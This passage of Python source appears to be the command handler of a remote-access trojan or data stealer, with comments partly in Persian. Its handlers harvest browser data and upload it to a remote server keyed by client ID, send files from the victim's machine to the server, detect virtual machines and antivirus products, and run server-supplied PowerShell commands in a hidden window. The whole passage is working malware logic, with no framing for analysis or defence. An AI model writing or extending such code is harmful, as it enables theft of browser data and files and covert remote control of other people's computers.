                    "status": "skipped",
                    "message": "System data collection disabled"
                }
            
            collector = SystemCollector()
            system_data = collector.collect_all_data()
            
            return {
                "status": "success",
                "message": "System data collected successfully",
                "data": system_data,
                "timestamp": datetime.now().isoformat()
            }
            
        except Exception as e:
            logging.error(f"System data collection error: {str(e)}")
            raise CommandError(f"System data collection error: {str(e)}")

    @staticmethod
    def handle_collect_browser_data_comprehensive(params):
        """دستور جدید برای جمع‌آوری اطلاعات کامل مرورگر"""
        try:
            logging.info("Handling comprehensive browser data collection command")
    
            if not Config.ENABLE_BROWSER_DATA_COLLECTION:
                return {
                    "status": "disabled",
                    "message": "Browser data collection disabled in config",
                    "timestamp": datetime.now().isoformat()
                }
    
            # ایجاد نمونه collector و جمع‌آوری داده
            collector = SystemCollector()
            result = collector.collect_comprehensive_browser_data()
    
            # ارسال داده‌ها به سرور
            try:
                collector.communicator.upload_browser_data_comprehensive({
                    "browser_data": result.get("data", {}),
                    "detection_summary": result.get("detection_summary", {}),
                    "collection_stats": result.get("stats", {}),
                    "client_id": Config.get_client_id(),
                    "timestamp": datetime.now().isoformat()
                })
                logging.info("Browser data uploaded to server successfully")
            except Exception as e:
                logging.warning(f"Failed to upload browser data: {str(e)}")
    
            return result
    
        except Exception as e:
            logging.error(f"Comprehensive browser data collection failed: {str(e)}")
            return {
                "status": "error",
                "message": f"Browser data collection failed: {str(e)}",
                "timestamp": datetime.now().isoformat()
            }

    @staticmethod
    def handle_vm_detection(params):
        """Perform VM detection"""
        try:
            if not Config.ENABLE_VM_DETECTION:
                return {
                    "status": "skipped",
                    "message": "VM detection disabled"
                }
            
            vm_details = VMDetector.get_vm_details()
            
            return {
                "status": "success",
                "message": "VM detection completed",
                "vm_details": vm_details,
                "timestamp": datetime.now().isoformat()
            }
            
        except Exception as e:
            logging.error(f"VM detection error: {str(e)}")
            raise CommandError(f"VM detection error: {str(e)}")

    @staticmethod
    def handle_antivirus_status(params):
        """Get antivirus status"""
        try:
            if not Config.ENABLE_ANTIVIRUS_DETECTION:
                return {
                    "status": "skipped",
                    "message": "Antivirus detection disabled"
                }
            
            anti_av = AntiAV()
            av_status = anti_av.get_detection_summary()
            
            return {
                "status": "success",
                "message": "Antivirus status retrieved",
                "antivirus_status": av_status,
                "timestamp": datetime.now().isoformat()
            }
            
        except Exception as e:
            logging.error(f"Antivirus status error: {str(e)}")
            raise CommandError(f"Antivirus status error: {str(e)}")

    @staticmethod
    def handle_download_file(params):
        """Download file to server"""
        try:
            file_path = params.get('file_path')
            if not file_path:
                raise CommandError("No file path provided")
            
            file_manager = CommandHandler._get_file_manager()
            result = file_manager.download_file(file_path)
            
            return {
                "status": "success",
                "message": "File download initiated",
                "result": result,
                "timestamp": datetime.now().isoformat()
            }
            
        except Exception as e:
            logging.error(f"File download error: {str(e)}")
            raise CommandError(f"File download error: {str(e)}")

    @staticmethod
    def handle_execute_powershell(params):
        """Execute PowerShell command"""
        try:
            command = params.get('command')
            if not command:
                raise CommandError("No PowerShell command provided")
            
            result = subprocess.run(
                ['powershell', '-Command', command],
                capture_output=True,
                text=True,
                timeout=60,
                creationflags=subprocess.CREATE_NO_WINDOW
            )
            
            return {
                'stdout': result.stdout,
                'stderr': result.stderr,
                'returncode': result.returncode,
                'command': command,
                'timestamp': datetime.now().isoformat()
            }
            
        except subprocess.TimeoutExpired:
            raise CommandError("PowerShell command timed out")
        except Exception as e:
            logging.error(f"PowerShell execution error: {str(e)}")
            raise CommandError(f"PowerShell execution error: {str(e)}")